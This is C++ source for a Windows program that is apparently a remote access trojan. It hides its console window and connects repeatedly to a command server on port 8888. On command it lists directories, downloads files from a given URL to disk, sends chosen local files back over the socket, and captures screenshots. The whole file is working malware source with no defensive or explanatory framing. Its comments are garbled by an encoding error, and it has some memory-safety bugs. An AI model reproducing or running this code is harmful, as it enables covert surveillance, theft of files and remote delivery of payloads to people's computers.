#include<stdio.h>
#include<iostream>
#include<cstring>
#include<string>
#include <tchar.h>
#include <io.h>
#include <sstream>
#include <afxwin.h>
#include <windows.h>
#include <cstring>
#include <fstream>
#include <winsock2.h>
#include <Urlmon.h>
using namespace std;
#pragma comment(lib,"ws2_32.lib")//windowssock��
#pragma comment(lib,"Urlmon.lib") //�����ļ������
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // ���������Ҫ��һ�����س���Ĵ���
//TCP�ͻ���
#define _CRT_SECURE_NO_WARNINGS
void SendFile(SOCKET sclient, string srcFileName);
LPCWSTR stringToLPCWSTR(std::string orig);
void download(string dourl, string a);
string dir(string path);
string deal(string things);
int connect();
void Screen(char filename[]);

int main()
{
	int temp = 10;
	while (true)
	{
		if (temp = 10)
		{
			temp = connect();
		}
		else
		{
			break;
		}
	}
	return 0;
}


void SendFile(SOCKET sclient, string srcFileName)
{
	int haveSend = 0;
	const int bufferSize = 1024;
	char buffer[bufferSize] = { 0 };
	int readLen = 0;
	//string srcFileName ;  //�����û���Ҫ���͵�·��
	ifstream srcFile;
	srcFile.open(srcFileName.c_str(), ios::binary);
	if (!srcFile){
		return;
	}
	while (!srcFile.eof()){
		srcFile.read(buffer, bufferSize);
		readLen = srcFile.gcount();
		send(sclient, buffer, readLen, 0);
		haveSend += readLen;
	}
	srcFile.close();
	cout << "send: " << haveSend << "B" << endl;
}

LPCWSTR stringToLPCWSTR(std::string orig)
{
	size_t origsize = orig.length() + 1;
	const size_t newsize = 100;
	size_t convertedChars = 0;
	wchar_t *wcstring = (wchar_t *)malloc(sizeof(wchar_t)*(orig.length() - 1));
	mbstowcs_s(&convertedChars, wcstring, origsize, orig.c_str(), _TRUNCATE);
	return wcstring;
}

void download(string dourl, string a)
{
	LPCWSTR url = stringToLPCWSTR(dourl);
	printf("downurl: %S\n", url);
	TCHAR path[MAX_PATH];
	GetCurrentDirectory(MAX_PATH, path);
	LPCWSTR savepath = stringToLPCWSTR(a);
	wsprintf(path, savepath, path);
	printf("savepath: %S\n", path);
	HRESULT res = URLDownloadToFile(NULL, url, path, 0, NULL);
	if (res == S_OK)
	{
		printf("downover\n");
	}
	else if (res == E_OUTOFMEMORY)
	{
		printf("recvlength has something wrong or dont set recvlength\n");
	}
	else if (res == INET_E_DOWNLOAD_FAILURE)
	{
		printf("url has something wrong\n");
	}
	else
	{
		printf("unkonwn error\n", res);
	}
}

string dir(string path)
{
	string result;
	long hFile = 0;
	struct _finddata_t fileInfo;
	string pathName, exdName;
	//    \\* ����Ҫ�������е�����,��ĳ�\\*.jpg��ʾ����jpg�����ļ�
	if ((hFile = _findfirst(pathName.assign(path).append("\\*").c_str(), &fileInfo)) == -1)
	{
	}
	do
	{
		result = result + "\n" + fileInfo.name;
	} while (_findnext(hFile, &fileInfo) == 0);
	_findclose(hFile);
	return result;
}

string deal(string things)
{
	//��������
	if (things.find("dir") != string::npos)/*     dir-D:\\    */
	{
		string result = things.substr(things.find_first_of("-") + 1);
		string temp = dir(result);
		cout << temp << endl;
		return temp;
	}
	else if (things.find("down") != string::npos)//down-http://www.anyeur.club-D:index.php
	{
		string downurl = things.substr(things.find_first_of("-") + 1, things.find_last_of("-") - things.find_first_of("-") - 1);
		string savepath = things.substr(things.find_last_of("-") + 1);
		download(downurl, savepath);
		return "download over!";
	}
	else if (things.find("pass") != string::npos)//pass-D:\\001.txt-D:\\002.txt
	{
		string sendfile = things.substr(things.find_first_of("-") + 1, things.find_last_of("-") - things.find_first_of("-") - 1);
		return "pass-" + sendfile;
	}
	else if (things.find("screen") != string::npos)//screen-D:\\001.jpg
	{
		string savepat = things.substr(things.find_last_of("-") + 1);
		char savepath[20];
		strcpy(savepath, savepat.c_str());
		Screen(savepath);
		return "screen over!";
	}
	else
	{
		return "nothing";
	}
}

int connect()
{
	WORD sockVersion = MAKEWORD(2, 2);
	WSADATA data;
	if (WSAStartup(sockVersion, &data) != 0)
	{
		printf("initialization failed!\n");
		return 10;
	}
	while (true)
	{
		SOCKET sclient = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
		if (sclient == INVALID_SOCKET)
		{
			printf("invalid socket!\n");
			return 10;
		}
		sockaddr_in serAddr; //Ҫ���ӵķ������� �� �˵��ַ
		serAddr.sin_family = AF_INET;
		serAddr.sin_port = htons(8888);
		serAddr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1"); //��ip��Ϊ��ַ�ṹ
		//�ͻ��˳�����Ҫbind�����˵��ַ,ϵͳ���Զ���� 

		if (connect(sclient, (sockaddr*)&serAddr, sizeof(serAddr)) == SOCKET_ERROR)
		{
			printf("connect error!\n");
			closesocket(sclient);
			return 10;
		}
		char recData[1024];
		string a;
		int ret = recv(sclient, recData, 1024, 0);
		if (ret>0)
		{
			recData[ret] = 0x00;
			cout << "command��" << recData << endl;
			string CMD(recData);
			a = deal(CMD);
		}
		if (a.find("pass") != string::npos)
		{
			string sendfile = a.substr(a.find_last_of("-") + 1);
			SendFile(sclient, sendfile);
			closesocket(sclient);
		}
		else
		{
			string data;
			data = a;
			const char* sendData;
			sendData = data.c_str(); //string21��Ϊconst char*
			cout << strlen(sendData) << endl;
			send(sclient, sendData, strlen(sendData), 0);
			closesocket(sclient);
		}
	}
	WSACleanup();
}

void Screen(char filename[])
{
	CDC *pDC;//��ĻDC
	pDC = CDC::FromHandle(GetDC(NULL));//��ȡ��ǰ������ĻDC
	int BitPerPixel = pDC->GetDeviceCaps(BITSPIXEL);//�����ɫģʽ
	int Width = pDC->GetDeviceCaps(HORZRES);
	int Height = pDC->GetDeviceCaps(VERTRES);
	printf("��ǰ��Ļɫ��ģʽΪ%dλɫ��\n", BitPerPixel);
	printf("��Ļ��ȣ�%d\n", Width);
	printf("��Ļ�߶ȣ�%d\n", Height);
	CDC memDC;//�ڴ�DC
	memDC.CreateCompatibleDC(pDC);
	CBitmap memBitmap, *oldmemBitmap;//��������Ļ���ݵ�bitmap
	memBitmap.CreateCompatibleBitmap(pDC, Width, Height);
	oldmemBitmap = memDC.SelectObject(&memBitmap);//��memBitmapѡ���ڴ�DC
	memDC.BitBlt(0, 0, Width, Height, pDC, 0, 0, SRCCOPY);//������Ļͼ���ڴ�DC
	//���´��뱣��memDC�е�λͼ���ļ�
	BITMAP bmp;
	memBitmap.GetBitmap(&bmp);//���λͼ��Ϣ
	FILE *fp = fopen(filename, "w+b");
	BITMAPINFOHEADER bih = { 0 };//λͼ��Ϣͷ
	bih.biBitCount = bmp.bmBitsPixel;//ÿ�������ֽڴ�С
	bih.biCompression = BI_RGB;
	bih.biHeight = bmp.bmHeight;//�߶�
	bih.biPlanes = 1;
	bih.biSize = sizeof(BITMAPINFOHEADER);
	bih.biSizeImage = bmp.bmWidthBytes * bmp.bmHeight;//ͼ�����ݴ�С
	bih.biWidth = bmp.bmWidth;//���
	BITMAPFILEHEADER bfh = { 0 };//λͼ�ļ�ͷ
	bfh.bfOffBits = sizeof(BITMAPFILEHEADER)+sizeof(BITMAPINFOHEADER);//��λͼ���ݵ�ƫ����
	bfh.bfSize = bfh.bfOffBits + bmp.bmWidthBytes * bmp.bmHeight;//�ļ��ܵĴ�С
	bfh.bfType = (WORD)0x4d42;
	fwrite(&bfh, 1, sizeof(BITMAPFILEHEADER), fp);//д��λͼ�ļ�ͷ
	fwrite(&bih, 1, sizeof(BITMAPINFOHEADER), fp);//д��λͼ��Ϣͷ
	byte * p = new byte[bmp.bmWidthBytes * bmp.bmHeight];//�����ڴ汣��λͼ����
	GetDIBits(memDC.m_hDC, (HBITMAP)memBitmap.m_hObject, 0, Height, p,
		(LPBITMAPINFO)&bih, DIB_RGB_COLORS);//��ȡλͼ����
	fwrite(p, 1, bmp.bmWidthBytes * bmp.bmHeight, fp);//д��λͼ����
	delete[] p;
	fclose(fp);
	memDC.SelectObject(oldmemBitmap);
}